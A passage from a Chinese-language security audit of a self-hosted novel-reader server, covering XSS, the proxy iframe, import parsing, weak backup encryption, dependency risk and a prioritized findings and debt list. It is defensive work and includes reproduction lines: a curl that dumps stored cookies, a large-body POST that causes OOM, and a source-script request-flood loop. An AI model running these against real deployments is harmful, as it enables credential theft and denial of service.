- 【事实】`/next` 服务**磁盘**目录（`StaticWeb.kt:277-290` `staticFiles("/next", nextDirectory)`），路径穿越由 Ktor 的 `staticFiles` 实现负责（Ktor 会规范化并拒绝逃逸）。
- 【事实】`/assets/{name}` 是独立路由 + 内容哈希 + immutable + gzip + ETag（`StaticWeb.kt:250-258` + `BundledAssets`）。
- 【事实】品牌图标上传：按**魔数**认 PNG/JPEG/WebP，**明拒 SVG**（"放进一张能带脚本的 SVG 等于自己开一条同源脚本执行面"）：`StaticWeb.kt:225-233`。
- 【推断】**未发现路径穿越**。P3：`/next` 的目录来自环境变量 `LEGADO_NEXT_DIR`（`ServerConfig.kt:56`），可被指向任意目录——但那需要能改环境变量（已完全控制进程）。

---

### 2.5 攻击面 A5：内容注入 / XSS

#### 2.5.1 前端零 HTML 注入点（强证据）

【事实】`product/web/src/**` 全量 grep `dangerouslySetInnerHTML|innerHTML|insertAdjacentHTML|outerHTML|document.write`，**命中 3 处，全部是注释**：
- `web/src/main.tsx:81`（解释为什么用 `textContent` 而不用 `dangerouslySetInnerHTML`）
- `web/src/features/reader/settingsPanel/SkinModal.tsx:35`（同上）
- `web/src/features/source-editor/SourceLoginUiPanel.tsx:61`（说明 iframe 里取 `outerHTML`）

正文渲染走 React 文本节点（`web/src/features/reader/ReaderBody.tsx:160-208` 逐行 `renderLine`），**第三方正文不进 HTML 解析**。Markdown 只用于**随包的** CHANGELOG/指南（`web/src/plugins/changelog/ChangelogPage.tsx:19-81`、`plugins/about/FeatureGuide.tsx:17`），且只处理粗体/行内代码，不注入 HTML。

⇒ **XSS 面基本为零**，这是本项目做得最干净的一块。

#### 2.5.2 内置浏览器代理：把第三方 HTML 放到了自己的源上（设计上最高危的一块）

- 【事实】目标站点被**整站反代**到本服务路径下，HTML 被重写、注入引导脚本、并**剥离目标站点的 CSP**（测试断言 `WebViewProxyTest.kt:74`：`assertFalse(out.contains("Content-Security-Policy"))` —— 因为代理页需要跑注入脚本）。
- 【事实】引导脚本主动屏蔽 frame-busting（把 `top`/`parent`/`frameElement` 指向自身）：`source/WebViewProxy.kt:664-690`。
- 【事实】前端用 **sandbox iframe 且不给 `allow-same-origin`**：`SourceLoginUiPanel.tsx:560`（`sandbox="allow-scripts allow-forms allow-popups allow-modals"`）、`MediaBlock.tsx:47`。
- **⇒ 结论**：第三方 JS 在本服务源上运行，但被关在不透明源的 iframe 里。**这个隔离是对的**，且是本设计能成立的前提。
- **P2 残余风险**：封套完全依赖 iframe `sandbox` 属性。若用户把代理 URL 直接**在顶层标签页打开**（右键"在新标签打开"、或书签），页面立刻与 `127.0.0.1:1234` **同源**，从而获得对整个 API 的读写能力（同源请求自带正确 Origin → 通过写闸门）。frame-busting 屏蔽只挡 `window.top` 赋值，挡不住用户在 UI 上主动导航。【建议】代理响应加 `X-Frame-Options`/`frame-ancestors` 之外，再加 `Sec-Fetch-Dest: iframe` 校验或响应级 CSP `sandbox` 指令（响应头 `Content-Security-Policy: sandbox allow-scripts allow-forms`），这样即使被顶层打开也仍是不透明源。

#### 2.5.3 `postMessage` 桥缺来源校验（新发现）

【事实】`web/src/features/source-editor/SourceLoginUiPanel.tsx:370-388`：`message` 监听器只校验 `data.__legadoInline === true`，**不校验 `event.source` 也不校验 `event.origin`**，随后把 `data.html` 直接当作登录页回传体交给后端（`continueInline(inline, data.html)`）。
- 影响：任何能向该窗口发 `postMessage` 的上下文（含 `allow-popups` 打开的弹窗，因为弹窗持有 `opener` 引用）都能伪造「登录页返回的 HTML」，进而影响书源登录动作的输入（`browserBody`）。
- 等级 **P2**（需要弹窗/引用链，且最终影响限于登录流程输入）。【建议】校验 `event.source === inlineFrameRef.current?.contentWindow`，或给每次会话发随机 nonce 并在桥脚本里回传。

#### 2.5.4 其他注入面

| 项 | 判定 | 证据 |
|----|------|------|
| 内置浏览器错误页 | **安全**：消息经 `&`/`<`/`>` 转义后插入 HTML | 【事实】`http/SourcesRoutes.kt:817-820` |
| SVG 作为正文图片 | **拒绝**（同源 SVG 能带脚本） | 【事实】`http/MediaRoutes.kt:96-97` 注释 + `localAssetType` 按魔数判（`MediaRoutes.kt:415`） |
| 品牌图标 | **拒绝 SVG**，按魔数认图 | 【事实】`StaticWeb.kt:225-233` |
| 图片 URL（前端） | **只允许 `http(s)://` 或 `/` 开头**：`web/src/lib/sourceImport.ts:40-48`。⚠️ 允许任意 http(s) 主机 → 第三方正文里的图会让浏览器直连第三方（IP 泄漏/追踪像素）。**P3** |
| EPUB 内联 `data:` 图 | **丢弃** | 【事实】`localbook/LocalBookParser.kt:135-138` |

#### 2.5.5 渲染/解析库的已知问题版本

- 【事实】无 PDF 解析库（`product/app/build.gradle:318-338` 全量依赖里没有 PDF —— 任务书提到的 PDF 面**不存在**）。
- 【事实】EPUB 用**自研** `LocalBookParser`（zip + Jsoup），不是第三方 EPUB 库 → 没有第三方解析器的 CVE 面。
- 见 §2.8 的库版本结论。

---

### 2.6 攻击面 A6：反序列化 / 导入面

#### 2.6.1 备份导入（`backup/BackupImporter.kt` 567 行）

| 攻击 | 防护 | 证据 |
|------|------|------|
| **zip-slip 路径穿越** | **不可能**：全程用 `ZipFile` 按条目名读，**从不解包到磁盘** | 【事实】`BackupImporter.kt:50`（注释）、`BackupImporter.kt:103`（`ZipFile(file.toFile()).use {…}`）、`:146`（只取 `substringAfterLast('/')` 作段名） |
| **zip 炸弹（谎报 size）** | 不信 `entry.size`，按**真实读取字节**封顶（读满 `MAX+1` 即拒） | 【事实】`BackupImporter.kt:415-421` |
| 声明体积上限 | 单条 64 MiB / 总计 256 MiB / 裸 JSON 64 MiB | 【事实】`BackupImporter.kt:516-518` |
| 坏 JSON | `runCatching` + 段级跳过并记入 `skippedSections`（不静默） | 【事实】`BackupImporter.kt:44-48` 注释、`:409-413`（`readSection`） |
| 编码错乱（GBK 发中文） | 请求级严格解码，非法字节 → 400 | 【事实】`http/StrictJsonConverter.kt`（装配于 `Application.kt:226-227`）、`http/StrictRequestText.kt:22-31` |
| **原子性（六域一起回滚）** | 整批在一笔 `database.transaction` 内，任何一步失败全回滚；有失败注入判据 | 【事实】`BackupImporter.kt:253`、测试 `BackupImportAtomicTest.kt` |
| 容器判别 | 按**内容魔数**（`PK`）而非扩展名 | 【事实】`BackupImporter.kt:99` |

⇒ **导入面防护完整，评级 P3（无问题）**。这是本项目第二块做得很好的地方。

#### 2.6.2 本地书导入（`localbook/LocalBookParser.kt` 563 行）

| 攻击 | 防护 | 证据 |
|------|------|------|
| EPUB zip 炸弹 | 条目数 ≤ 10000、单条 ≤ 64 MiB、总计 ≤ 512 MiB，且**按真实字节**记账 | 【事实】`LocalBookParser.kt:38-42`、`:244-252`、`:414-425` |
| `../` 路径穿越（epub 内引用） | `normalizeZipPath` 对 `..` 做根钳制（栈空时忽略） | 【事实】`LocalBookParser.kt:550-560` |
| 取图时的穿越 | ① `bookId` 必须匹配 `LOCAL_BOOK_ID` 正则（同时是磁盘文件名）；② 显式拒 `..`（`wanted.contains("..")`）；③ 只接受包里**完全相等**的 entry 名（不做前缀匹配）；④ 单条 ≤ 5 MiB；⑤ 只回图片（魔数） | 【事实】`http/MediaRoutes.kt:99-125` |
| TXT `<img>` 注入 | 只认绝对 http(s)，其余连标签一起删 | 【事实】`LocalBookParser.kt:76-84` |

#### 2.6.3 请求体大小（新发现）

- 【事实】`http/StrictRequestText.kt:22-31` 用 `receiveChannel().readRemaining().readByteArray()` —— **无上限读进内存**。调用点 2 处：`http/ReplaceRulesRoutes.kt:106`（净化规则导入）、`http/SourcesRoutes.kt:577`（外部浏览器登录地址）。
- 【推断】默认堆 1g（`product/start.mjs:354` `-Xmx${LEGADO_MAX_HEAP || '1g'}`）。一个几百 MB 的 POST body 可直接 OOM 进程。**P2**（需要能直连端口；局域网/本机）。验证方法：`curl -X POST --data-binary @bigfile` 打 `PUT /api/replace-rules/import`，观察 OOM。
- 【建议】沿用导入侧的 `MAX_JSON_BYTES` 口径，给 `receiveStrictText` 加 `limit` 参数。

#### 2.6.4 结构化的导入 DAO

- 【事实】`data/ImportDao.kt`（`importRssSourcesOn`/`importBookGroupsOn`/`importLibraryOn`）都是「事务内实现」，由调用方（BackupImporter）统一开事务（`ImportDao.kt:19-26,68-72,105-109`）。⇒ 正确形状。
- 【事实】`SourceCodec.normalizeSourceId` 归一化书架 `origin`，使其与书源主键对齐（`BackupImporter.kt:52` 注释、`:492`）。

---

### 2.7 攻击面 A7：加密 / 密钥

| 项 | 结论 | 证据 |
|----|------|------|
| 硬编码密钥/口令/私钥 | **未发现**。全仓 grep `password|secret|apiKey|-----BEGIN`，命中全部是**局部变量或形参**（`ScriptCrypto.kt:98`、`JavaPackages.kt` 的 `KeyMaterial.secret`、`BackupRoutes.kt:116` 的上传密码） | 【事实】grep 结果（§附录 A） |
| `rules/ScriptCrypto.kt` | 书源解密工具（AES/CBC 等），密钥来自**脚本参数**，不落库 | 【事实】`ScriptCrypto.kt:98,139-141` |
| 备份加密 KDF | **弱**：`AES/ECB/PKCS5`，密钥 = `MD5(密码)` 十六进制串前 16 字符（不是 16 字节摘要），无盐、无迭代 | 【事实】`backup/BackupImporter.kt:60-77`。**这是上游 Legado 的兼容口径**，为能读手机备份必须照抄。P3，但重建时**必须**在文档里写清「这不是我们的安全设计，是兼容成本」 |
| 会话 Cookie 内存层 | 不落盘、不进备份 | 【事实】`data/SessionCookies.kt:14-17` |
| 一次性令牌 | `SecureRandom` 24 字节，30 分钟 TTL，绑定 sourceId | 【事实】`source/WebViewProxy.kt:83-85`、`:88-95`、`:90-99` |
| 明文凭据落库 | **是**：`cookie` 表明文（`CookieDao.kt:44-46` `select cookie from cookie`）。设计如此（单人本地软件） | 【事实】 |

---

### 2.8 攻击面 A8：依赖已知漏洞

> 全部标【推断】：本次审计无网络权限，**未查询任何 CVE 数据库**。人工核对方法：对每个坐标跑 `osv-scanner` / GitHub Advisory 检索，或用 `gradle dependencyCheckAnalyze`。

| 依赖 | 版本 | 证据 | 评价 |
|------|------|------|------|
| `io.ktor:*` | **3.4.3** | `build.gradle:318-331` | 【推断】Ktor 3.x 属于当前主线，3.4.3 是较新补丁位；但 Ktor 历史上出过 `ContentNegotiation`/`WebSocket` 类问题，且本项目**用 WebSocket**（搜索流、TTS）——建议核对 3.4.3 之后是否有安全补丁 |
| `org.mozilla:rhino` | **1.8.0** | `build.gradle:337` | 【推断】**最高关注的依赖**：它是**不可信脚本的执行器**，任何 Rhino 逃逸/DoS CVE 都能穿透本项目的核心防线。1.8.0 仍是维护线，但 Rhino 的 `ClassShutter` 语义变更、`NativeJavaObject` 泄漏史上有先例。建议：锁定版本 + 每次升级都重跑 `JsSandboxResourceLimitTest`/`SandboxErrorScopeTest` + 真库抽样 |
| `org.jsoup:jsoup` | **1.18.3** | `build.gradle:333` | 【推断】1.18.x 是近期主线；jsoup 处理**不可信 HTML**，其解析器/选择器的 CPU 复杂度（深度嵌套导致 O(n²)）是需要压力的点，不是 CVE 问题 |
| `cn.wanghaomiao:JsoupXpath` | **2.5.1** | `build.gradle:335` | 【推断】**低维护风险**：单作者项目，更新稀疏，且把**书源里的 XPath 字符串**交给它编译执行。若 XPath 含病态表达式，CPU 打满的风险由 30s 墙钟兜住 |
| `com.jayway.jsonpath:json-path` | **2.9.0** | `build.gradle:336` | 【推断】JSONPath 表达式来自书源，**不可信输入**；历史上 json-path 有 ReDoS/栈溢出类报告。建议对书源 JSONPath 加长度/深度上限 |
| `org.xerial:sqlite-jdbc` | **3.49.1.0** | `build.gradle:332` | 【推断】较新；无已知高风险 CVE |
| `org.slf4j:slf4j-simple` | 2.0.16 | `build.gradle:338` | 【推断】无风险，但 `slf4j-simple` 写 stderr，与自研 `LogService` 并行（§3 重复实现） |
| `react` / `react-dom` | **19.1.0** | `product/web/package.json:30-31` | 【推断】较新 |
| `vite` | **6.3.5** | `package.json:33` | 【推断】仅构建期；Vite dev server 的已知问题（`server.fs` 绕过）只在 `npm run dev` 时相关，**不随产物发布**。P3 |
| `hls.js` | `^1.7.3` | `package.json:29` | 【推断】`^` 浮动版本 → 构建不可复现；hls.js 处理**第三方 m3u8**，历史上出过若干解析崩溃。建议钉死 |
| `puppeteer-core` | `^25.11.0` | `package.json:39` | 【推断】仅 devDependency（e2e），不进产物 |
| `@material/material-color-utilities` | `^0.4.0` | `package.json:27` | 【推断】`^` 浮动 |

**【建议】依赖策略（重建时必须设计进去）**：① 所有 `^` 改精确版本 + 提交 lockfile（当前 `package.json` 用 `^` 的有 6 个）；② CI 加 `osv-scanner`；③ **Rhino 升级必须配一条「沙箱不变量」回归判据**（ClassShutter 生效、沙箱里不存在 `NativeJavaObject`、`GzipLimits` 生效），否则一次无害的依赖升级可能静默拆掉 RCE 防线。

---

### 2.9 安全发现汇总表

| ID | 等级 | 发现 | 证据 |
|----|------|------|------|
| S1 | **P0** | Docker 镜像默认 `LEGADO_HOST=0.0.0.0` + `LEGADO_ALLOW_EXTERNAL_BIND=1` + 零鉴权 = 整库（含明文 Cookie）对网络开放 | `product/Dockerfile:50`、`http/Guard.kt:15-20` |
| S2 | **P1** | 恶意书源可借「按域共享 Cookie + 无限制外呼」读走用户在任意站点（该源能触达的域）的登录态并外传 | `data/CookieDao.kt:94-100`、`rules/RuleRunner.kt:1392-1394`、`rules/JsSandbox.kt:367-376` |
| S3 | **P1** | 内置浏览器代理用裸 `HttpClient`（无 PinnedProxy）→ DNS 重绑定可绕过 SSRF 闸门 | `source/WebViewProxy.kt:60-63` vs `ops/NetworkSecurity.kt:54-69` |
| S4 | **P1** | 自定义 TTS 出站只校验 scheme，无内网段判定，逐跳重定向同样只校验 scheme | `tts/EdgeTtsService.kt:341-345,361-375` |
| S5 | **P1** | 书源 JS 无外呼次数/并发预算（30 秒内可打数千次） | `rules/JsSandbox.kt`（无计数器）、`rules/JavaPackages.kt:1208` |
| S6 | **P2** | `0.0.0.0` 绑定时同源判定对**任意私有 IP 字面量**放行 → 局域网页面可 CSRF | `http/Guard.kt:177,184-190` |
| S7 | **P2** | `postMessage` 桥不校验 `event.source`/`origin` | `web/src/features/source-editor/SourceLoginUiPanel.tsx:370-388` |
| S8 | **P2** | 代理 HTML 无响应级 CSP、`X-Frame-Options` 缺失；顶层打开即获得同源全权限 | `http/SourcesRoutes.kt:793-812`、`StaticWeb.kt:133-146` |
| S9 | **P2** | `receiveStrictText` 无请求体大小上限 → OOM | `http/StrictRequestText.kt:25` |
| S10 | **P2** | `Reload(url)+eval` 把信任边界扩到远端脚本；无「日志脱敏」基础设施；`GET .../browser/cookies` 明文回 Cookie 且无鉴权 | `rules/JsSandbox.kt:341-354`、`ops/LogService.kt`（无 redact）、`http/SourcesRoutes.kt:536-543` |
| S11 | **P2** | `READ_ONLY_POSTS` 残留 3 条不存在的 `/api/agent/*`，若 AI 恢复即为免闸门写入口 | `http/Guard.kt:41-43` |
| S12 | **P3** | `WebViewProxy.decodeBody` / `MediaRoutes` HLS 解码用**无界** `GZIPInputStream.readAllBytes()`，绕过 `GzipLimits` → 压缩炸弹可 OOM | `source/WebViewProxy.kt:504-510`、`http/MediaRoutes.kt:392-398` vs `rules/GzipLimits.kt:45-60` |
| S13 | **P3** | 纯 JS 堆分配不计入 64MB 宿主预算【未确认】 | `rules/JsGuard.kt:122-124` 注释 |
| S14 | **P3** | 备份加密用 AES/ECB + MD5 派生密钥（上游兼容口径） | `backup/BackupImporter.kt:60-77` |
| S15 | **P3** | `X-Content-Type-Options` 只加在媒体端点；`/healthz` 谎报 `ai: true` | `MediaRoutes.kt:75,122,237,253`、`Application.kt:287` |

---

## 3. 技术债务清单（P0/P1/P2/P3）

> 字段：**具体文件 | 代码位置 | 问题原因 | 影响范围 | 复现条件 | 修复建议 | 修复风险**

### 3.1 P0（重建前必须设计决策，不能靠"以后修"）

| # | 文件 | 代码位置 | 问题原因 | 影响范围 | 复现条件 | 修复建议 | 修复风险 |
|---|------|----------|----------|----------|----------|----------|----------|
| D0-1 | `product/Dockerfile` | `:50` | 镜像默认外部绑定 + 放行 + 零鉴权；把"本地单人软件"直接变成"匿名公网服务" | 所有容器部署用户；A1（Cookie）+A2（书库）全暴露 | `docker run -p 8080:8080` 后从另一台机器访问 `http://<ip>:8080/api/shelf` | 三选一：外部绑定时强制 token / Dockerfile 改回回环 + compose 显式给 / 只读默认 | 中：改变现有部署方式，需迁移说明 |
| D0-2 | `rules/JsSandbox.kt` `rules/JavaPackages.kt` | 2100 + 1415 行 | **两个巨型文件承载唯一的 RCE 防线**，且职责混合（沙箱生命周期 + Legado API 桥 + 45 个 Java 白名单类 + 加解密 + okhttp 假对象） | 任何改动都在这两个文件里，回归半径 = 全部书源 | 改一行 → 需跑 `GoldenRuleTest`(逐字节) + 真库抽样 | 先补"沙箱不变量"判据（ClassShutter 生效 / 无 NativeJavaObject / 预算生效），再按白名单类族拆分（crypto / text / net / okhttp 四包） | 高：RCE 防线，动错即全线开放。**顺序不能颠倒** |
| D0-3 | `rules/RuleRunner.kt` | 1758 行 | HTTP 段（`fetchDetailedImpl`/`buildRequest`/`effectiveHeaders`）与规则取值、登录、缓存耦合在一个类，且 `JsSandbox(this)` 硬依赖 | 所有书源请求；也是 SSRF 闸门的调用点 | 想给 "fetch" 加一条纪律（如外呼预算）时无处下钩子 | 先抽窄接口 `Fetcher`（避开 `JsSandbox(this)`），把 §2.2.6 的外呼预算挂在接口上 | 中高：AGENTS.md §7 已列为待拆项（"下一步 HTTP 段"） |

### 3.2 P1（真实缺陷，应在 Phase 1 解决）

| # | 文件 | 代码位置 | 问题原因 | 影响范围 | 复现条件 | 修复建议 | 修复风险 |
|---|------|----------|----------|----------|----------|----------|----------|
| D1-1 | `source/WebViewProxy.kt` | `:60-63` | 裸 client，无 PinnedProxy → DNS TOCTOU（见 S3） | 内置浏览器登录流程 | 攻击者控 DNS 的登录站，解析后改指内网 | 换 `NetworkSecurity.newHttpClient()` | 低：client 接口兼容，`Redirect.NEVER` 已一致 |
| D1-2 | `tts/EdgeTtsService.kt` | `:341-345,361-375` | `assertSafeTtsTarget` 只判 scheme（见 S4） | 自定义 TTS 用户 | 填/被诱导填内网地址，或上游 302 到内网 | 改为调 `NetworkSecurity.resolveAndValidateSafeHttpTarget` + 用受控 client | 低：函数是纯判定 |
| D1-3 | `rules/*`（全） | 无计数器 | 外呼无预算（见 S5） | 第三方站点（DDoS 放大）+ 本机 IO 池 | 恶意源 `for(i=0;i<99999;i++) java.ajax(...)` | 在 fetch 入口按执行上下文计数（如 200 次/20 并发），超限抛 `Exception` | 中：需真库抽样确认合法源的单次请求数分布 |
| D1-4 | `http/Guard.kt` | `:177,184-190` | 同源判定只看"是不是私有 IP 字面量"，不看是不是**本机**（见 S6） | 所有 `0.0.0.0` 部署 | 局域网另一台机器 8080 端口起恶意页 | `isOwnOriginHost` 在绑 `0.0.0.0` 时只接受**本机实际网卡的 IP**（枚举 `NetworkInterface`），不接受任意私网字面量 | 低：判定收窄，非浏览器客户端不受影响 |
| D1-5 | `ops/LogService.kt` | 全文（无 redact） | 无脱敏机制，凭据泄露只靠"没人手滑" | 日志库 + `GET /api/system/logs` | 任一新代码 `log.info("{}", headers)` | 加 `redact(map)` + 对 `cookie/authorization/token/secret` 键自动打码 | 低 |
| D1-6 | `http/SourcesRoutes.kt` | `:536-543` | `GET .../browser/cookies` 明文回全部 Cookie，无鉴权无 Origin 校验 | 能直连端口的任何客户端 | `curl http://127.0.0.1:1234/api/sources/<id>/browser/cookies` | 外部绑定时禁用；或要求一次性令牌 | 低 |
| D1-7 | `http/StrictRequestText.kt` | `:25` | 无界读请求体（见 S9） | 两个导入端点 | 大 body POST → OOM | 加 `limit` 参数（复用 64MiB 口径），用有界读 | 低 |
| D1-8 | `data/Database.kt` `data/ShelfDao.kt` `data/CacheDao.kt` | `Database.kt:134-137`；`ShelfDao.kt:25,36,186,230,235,250,255`（7 处手管 `autoCommit`）；`CacheDao.kt:83,204` | **两套事务模型并存**：新规矩「谁都不许动 `autoCommit`」（`Database.kt:130-131`），但 `ShelfDao`/`CacheDao` 的老函数仍自己开关，会把外层事务**静默提交** | 所有跨表写；0.2.35「批量删书事故」已因此发生过一次 | 把 `ShelfDao` 的老函数包进 `database.transaction{}` → 数据静默半提交 | 逐个改造成 `write{}`/`transaction{}`，每改一个补一条原子性判据（仿 `BackupImportAtomicTest`） | **高**：直接改库写入语义，必须逐函数配判据 |

### 3.3 P2（结构性债务，Phase 2 处理）

| # | 文件 | 代码位置 | 问题原因 | 影响范围 | 复现条件 | 修复建议 | 修复风险 |
|---|------|----------|----------|----------|----------|----------|----------|
| D2-1 | `web/src/features/reader/ReaderScreen.tsx` | 2403 行 | 状态中枢：正文渲染/分页/TTS/漫画/导航/笔记全在一个组件 | 整个阅读器 | 任意阅读器改动 | 已拆 6 hook + 3 展示组件（AGENTS.md §7.1）；继续拆 `toggleBookmark` 与分页测量 | 中：先补行为判据 |
| D2-2 | `rules/RuleRunner.kt` | 1758 行 | 见 D0-3 | — | — | 见 D0-3 | — |
| D2-3 | `http/SourcesRoutes.kt` | 830 行 | 书源 CRUD + 批量 + 体检 + 登录 + 内置浏览器代理 + Cookie 同步全在一个文件 | 书源域全部端点 | — | 按 /browser、/login、/cookie 三段拆文件 | 低：路由拆分不改语义 |
| D2-4 | `data/CookieDao.kt` | 716 行 | 桶键、读写、4096 淘汰、Set-Cookie 解析、提及统计（含预热线程 `MentionsWarmer`）、会话层合并全在一处 | 所有登录态 | — | 拆 `CookieBucket`(纯函数) / `CookieStore`(IO) / `Mentions`(统计) | 低 |
| D2-5 | `source/WebViewProxy.kt` | 817 行 | 令牌、代理、Cookie 收割、HTML 重写、CSS 重写、引导脚本注入（内嵌 ~140 行 JS 字符串）、域名判定全在一处 | 内置浏览器 | — | 引导脚本外置成资源文件；HTML/CSS 重写抽纯函数（好测） | 中：重写逻辑有测试（`WebViewProxyTest`） |
| D2-6 | **重复实现：抓取+解码** | `rules/RuleRunner.kt:117`、`cache/CoverCache.kt:41`、`http/MediaRoutes.kt:448`、`http/ReplaceRulesRoutes.kt:128`、`subscription/SubscriptionService.kt:39`、`source/WebViewProxy.kt:60`、`tts/EdgeTtsService.kt:28`、`ops/UpdateCheck.kt:42` | **8 个出站 client + 各自的重定向/解压/字符集处理**，其中 3 个漏了 SSRF 闸或漏了 GzipLimits（S3/S4/S12） | 全部网络面 | 每加一类出站就要重抄一遍纪律 | 收敛成 1 个 `HttpFetcher`（闸门、重定向、解压上限、字符集、Cookie 一处实现） | 中：改 8 个调用点 |
| D2-7 | **重复实现：Cookie 解析** | `data/CookieDao.kt:646`（`parseCookiePairs`）、`rules/RuleRunner.kt:1421`（`mergeCookieStrings`）、`data/CookieDao.kt:511`（`extractCookiePair`）、`JsSandbox.kt:972-1030`（JS 桥侧再走一遍） | 同一语义 4 份 | 登录态一致性 | 一条 Cookie 带引号/逗号时两侧行为可能不同 | 抽 `CookieCodec` 纯函数集 | 低 |
| D2-8 | **重复实现：字符集/编码** | `TextDecoding.kt`（`decodeTextAuto`）、`rules/ResponseBody.kt:36-50`、`source/WebViewProxy.kt:488-503`（`detectCharset`）、`JavaPackages.kt:676-682`（`charsetOf` 每处 `Charset.forName` + runCatching 各写一遍，5+ 处） | 中文站点乱码是本品类第一号故障 | 正文/订阅/种子/JS 桥 | 换一个 GBK 站点 | 统一到 `TextDecoding` | 低 |
| D2-9 | **重复实现：`.uri` 拼接与绝对化** | `source/WebViewProxy.kt:513`（`absolutize`）、`rules/RuleUrlSupport.kt`、`rules/ScriptHtml.kt`、`rules/RuleRunner.kt:1577` | 相对 URL 解析 4 份 | 图片/链接 | 一个 `../` 相对地址 | 收敛到一个 `UrlResolver` | 低 |
| D2-10 | `ops/LogService.kt` + `slf4j-simple` | `Application.kt:252-268` 同时在用 | 两套日志并存：结构化 `LogService`（进库，前端可读）与 slf4j 直接 stderr | 可观测性 | — | 统一到 `LogService`，slf4j 只作桥 | 低 |
| D2-11 | `product/start.mjs` | 413 行 / 22.8 KB | 启动器承担：JVM 参数、端口协商、jar 定位、CDS、环境注入、健康等待、浏览器打开…… | 所有启动路径 | — | 拆成 `runtime/` 下的端口/进程/CDS 三个模块 | 低 |
| D2-12 | 构建发布 | `start.mjs` 22.8KB + `stop.mjs` 4.8KB + `DesktopLauncher.kt` 621 行 + `Dockerfile` + **两个 `fun main`**（`Application.kt:114`、`DesktopLauncher.kt`）+ `scripts/tasks.mjs` | 5 个入口/编排者，各自一份"怎么把服务跑起来"的知识 | 发版与故障定位 | 改端口逻辑要改 4 处 | 定义单一起源：`LaunchPlan` 数据结构，各入口只负责渲染 | 中 |

### 3.4 P3（卫生问题）

| # | 文件 | 代码位置 | 问题原因 | 影响范围 | 修复建议 | 修复风险 |
|---|------|----------|----------|----------|----------|----------|
| D3-1 | 全仓 | 418 处 `runCatching`（Kotlin），Top：`JsSandbox.kt` 49、`JavaPackages.kt` 30、`DesktopLauncher.kt` 24、`ExternalBrowserLogin.kt` 20、`RuleRunner.kt` 19、`SourcesRoutes.kt` 19 | 静默失败是主流风格；好在绝大多数带 `getOrDefault`/`getOrElse` 兜底值 | 排障成本 | 给 `runCatching` 加"必须带日志或显式兜底值"的 lint；安全敏感处（闸门判定）禁止 `getOrDefault(放行值)` | 低 |
| D3-2 | `source/WebViewProxy.kt` | `:506`；`http/MediaRoutes.kt:394` | 无界 `GZIPInputStream.readAllBytes()`（S12） | 内存 | 走 `GzipLimits.unzipBounded` | 低 |
| D3-3 | 全仓 | `TODO/FIXME/HACK/XXX` = **0**（Kotlin 0、前端 0） | 无标记债务；债务全写成散文注释（信息量大但不可检索） | 债务不可度量 | 引入 `NOTE:`/`DEBT:` 前缀约定 + 一个统计脚本 | 低 |
| D3-4 | `product/web/package.json` | `:27,29,35,39` 等 6 个 `^` 浮动版本 | 构建不可复现 | 发布物差异 | 钉死 + 提交 lockfile | 低 |
| D3-5 | `AppConfig.kt` | 全文 277 行，40+ 环境变量 | 单一环境变量表 + 记账机制（`envReads`）设计不错，但**没有集中校验**（如 `jsHostBytes=0` 表示不设限，是个危险默认的反向开关） | 运维 | 加启动期"危险配置"体检并打警告 | 低 |
| D3-6 | `ServerConfig.kt` | `:30`（`aiEnabled` 默认 `true`）、`http/Guard.kt:41-43`、`agent-api.json`（144 条） | AI 下线后的三处残留（S11） | 文档/健康检查说谎 | 清掉或改为"能力已移除" | 低 |

---

## 4. 没有测试保护的高危模块

### 4.1 测试存量（实测）

- 【事实】后端测试文件：**139 个**（`product/app/src/test/kotlin/io/legado/*.kt`）。
- 【事实】其中安全向（文件名单）：`NetworkSecurityTest`、`PinnedProxyTest`、`SameOriginGuardTest`、`BindGuardTest`、`RuleHttpGuardTest`、`RuleLoginGuardTest`、`ProxyHeadersTest`、`WebViewProxyTest`、`WebViewProxyRouteTest`、`JsGuardLimitsTest`、`JsSandboxResourceLimitTest`、`JsSandboxHostBudgetTest`、`JsSandboxHostAmplificationTest`、`SandboxErrorScopeTest`、`GzipLimitsTest`、`CookieLayersTest`、`BackupImportAtomicTest`、`BackupImportTest`、`LocalBookParserTest`、`LocalBookImageTest`、`StrictJsonRequestTest`、`ApiContractTest`、`HttpSurfaceNegativeTest`、`GoldenRuleTest` 等 40 个。
- 【事实】前端：`web/test/` 用自研 node:test runner（`package.json:22` `tsx test/run-all.ts`）。

### 4.2 高危但**无直接测试**的模块（按风险排序）

| 模块 | 为什么高危 | 测试现状 | 建议 |
|------|-----------|----------|------|
| **`tts/EdgeTtsService.kt` 的 `assertSafeTtsTarget`** | 出站闸门，却只判 scheme（S4） | 【事实】`EdgeTtsTest.kt` 存在，但未见针对内网/回环地址的判据（grep `127.0.0.1`/`localhost` 在 `EdgeTtsTest` 中无命中） | 补 3 条：`http://127.0.0.1`、`http://10.0.0.5`、302 到内网 |
| **`source/WebViewProxy.kt` 的 DNS 重绑定面** | 裸 client（S3） | 【事实】`WebViewProxyTest` 覆盖 HTML 重写/CSP 剥离，`WebViewProxyRouteTest` 覆盖路由；**没有**"解析后改址"的判据（这类只能靠 PinnedProxy 结构保证） | 换 PinnedProxy 后，`PinnedProxyTest` 的既有判据即覆盖 |
| **`rules/` 的外呼次数** | 无预算（S5） | 【事实】无任何计数判据 | 新增 `JsEgressBudgetTest` |
| **`http/StrictRequestText.kt`** | 无界读（S9） | 【事实】`StrictJsonRequestTest` 只测编码严格性 | 补超大 body 判据 |
| **`ops/LogService.kt` 的脱敏** | 无脱敏机制（S10） | 【事实】`LogServiceTest` 存在，但无"不得记录凭据"判据 | 加 `redact` 后补判据 |
| **`data/ShelfDao.kt` / `CacheDao.kt` 的事务** | 与 `Database.transaction` 冲突（D1-8） | 【事实】`DatabaseTest`、`DatabaseLifecycleTest` 存在；未见"ShelfDao 老函数在嵌套事务内"的判据 | 逐函数补原子性判据 |
| `rules/RuleValue.kt`（802 行，模板表达式求值） | 规则核心，输入完全不可信 | 【事实】有 `BareJsonListRuleTest`、`IndexSelectorTest`、`LooseUrlOptionsTest`；覆盖看起来分散 | 补 fuzz（模板注入/超长表达式） |
| `web/src/features/reader/ReaderScreen.tsx`（2403 行） | 最大前端状态中枢 | 【事实】前端测试集中在纯函数（`LogicalPosition` 等）；组件级几乎无 | 抽纯函数 + 补 hook 判据 |

### 4.3 结论

**高危模块的测试覆盖优于同类个人项目**（尤其沙箱与 SSRF 面，40 个专门判据），但三个**新增缺口**（TTS 出站、外呼预算、请求体上限）正好落在"这次审计才发现的问题"上 —— **没有测试保护，正是它们一直没被发现的原因**。重建时建议把「每条安全边界必须有一条会红的判据」写成硬规矩（当前 `NetworkSecurity`/`PinnedProxy` 就是这么做的，可以直接照抄形状）。

---

## 5. 文档与代码漂移实例

